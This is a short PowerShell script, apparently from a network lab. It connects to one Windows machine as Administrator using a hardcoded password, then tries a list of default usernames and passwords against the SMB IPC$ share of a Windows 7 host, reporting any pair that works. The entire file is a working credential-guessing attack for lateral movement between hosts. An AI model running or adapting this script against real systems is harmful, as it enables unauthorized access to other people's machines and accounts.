$pass = ConvertTo-SecureString "123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("Administrator", $pass)

Invoke-Command -ComputerName "192.168.1.132" -Credential $cred -ScriptBlock {
    Write-Host "=== TEST CONNECTION TO WIN7 (192.168.11.2) ==="
    $accounts = @("Administrator", "User", "SinhVien", "Admin")
    $passwords = @("123", "abc@123", "Longko0!", "")
    
    foreach ($u in $accounts) {
        foreach ($p in $passwords) {
            $cmd = "net use \\192.168.11.2\ipc$ `"$p`" /user:$u 2>&1"
            $out = Invoke-Expression $cmd
            if ($LASTEXITCODE -eq 0) {
                Write-Host "[+] SUCCESS connecting to Win7 with User: '$u', Pass: '$p'!" -ForegroundColor Green
                net use \\192.168.11.2\ipc$ /delete /y > $null
                return
            }
        }
    }
    Write-Host "[-] Could not authenticate to Win7 with default credentials. Win7 is accessible on network (Ping & SMB ports are OPEN), but requires local Win7 credentials to run commands inside Win7." -ForegroundColor Yellow
}
